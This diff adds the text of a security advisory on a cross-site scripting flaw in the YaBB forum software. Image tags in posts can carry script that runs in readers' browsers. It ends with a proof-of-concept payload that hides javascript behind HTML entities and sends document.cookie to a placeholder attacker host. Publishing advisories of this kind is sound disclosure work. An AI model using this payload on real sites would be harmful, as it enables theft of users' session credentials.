@@ -1,0 +1,13 @@
+source: http://www.securityfocus.com/bid/3828/info
+
+YaBB (Yet Another Bulletin Board) is freely available web forums/community software that is written in Perl. YaBB will run on most Unix/Linux variants, MacOS, and Microsoft Windows 9x/ME/NT/2000/XP platforms.
+
+YaBB is prone to cross-agent scripting attacks via the insertion of HTML tags into image links in messages. Due to insufficient input validation, it is possible to insert arbitrary script code in forum messages/replies. The malicious script code will be executed in the browser of the user viewing the message, in the context of the site running YaBB.
+
+This makes it possible for a malicious user to post a message which is capable of stealing another legitimate user's cookie-based authentication credentials.
+
+[img]javascr&#x69;pt:document.write
+('&#x3cimg
+src=&#x68;tt&#x70;://attackerssite/tools/cookie.plx?cookie='+escape(docu
+ment.cookie)+'&#x3e')
+[/img] 
